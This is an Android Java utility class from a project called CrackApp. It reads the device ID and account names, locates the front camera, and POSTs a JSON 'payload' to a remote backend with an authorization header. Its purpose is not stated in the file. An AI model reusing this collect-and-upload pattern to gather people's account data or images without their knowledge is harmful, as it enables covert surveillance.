package co.poweramp.crackapp;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.hardware.Camera;
import android.provider.Settings;
import android.util.Log;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.loopj.android.http.AsyncHttpClient;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;

import co.poweramp.crackapp.receiver.Payload;
import co.poweramp.crackapp.receiver.PayloadSerialiser;
import co.poweramp.crackapp.receiver.SaneAsyncHttpResponseHandler;
import cz.msebera.android.httpclient.Header;
import cz.msebera.android.httpclient.entity.StringEntity;

/**
 * CrackApp
 * <p/>
 * Created by duncan on 26/12/15.
 * Copyright (c) 2015 Duncan Leo. All Rights Reserved.
 */
public class Util {
    private static final String TAG = "Util";

    public static int getFrontCameraId() {
        int numCameras = Camera.getNumberOfCameras();
        Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
        for (int i = 0; i < numCameras; i++) {
            Camera.getCameraInfo(i, cameraInfo);
            if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                return i;
            }
        }
        return -1;
    }

    /**
     * Submit a payload
     * @param context
     * @param p
     */
    public static void submitPayload(Context context, Payload p) {
        AsyncHttpClient httpClient = new AsyncHttpClient();
        httpClient.addHeader("Authorization", Constants.BACKEND_AUTHORIZATION_KEY);
        final Gson gson = new GsonBuilder().registerTypeAdapter(Payload.class, new PayloadSerialiser()).setPrettyPrinting().create();
        String json = gson.toJson(p);
        StringEntity entity;
        try {
            entity = new StringEntity(json);
        } catch (Exception e) {
            e.printStackTrace();
            return;
        }
        Log.d(TAG, "Sending JSON: " + json);
        httpClient.post(context, Constants.BASE_URL + "/records/add", entity, "application/json", new SaneAsyncHttpResponseHandler() {
            @Override
            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
                Log.d(TAG, "Sent payload to server successfully.");
                String resp = new String(responseBody);
                Log.d(TAG, "Server response: " + resp);
            }

            @Override
            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
                Log.d(TAG, "Failed to send payload to server: " + statusCode);
                String resp = new String(responseBody);
                Log.d(TAG, "Server response: " + resp);
            }
        });
    }

    public static String getUniqueDeviceId(final Context context) {
        return Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
    }

    public static Account[] getAccounts(Context context) {
        AccountManager accountManager = AccountManager.get(context);
        return accountManager.getAccounts();
    }

    public static String getMainAccount(Context context) {
        if (getAccounts(context).length > 0) {
            return getAccounts(context)[0].name;
        } else {
            return null;
        }
    }
}
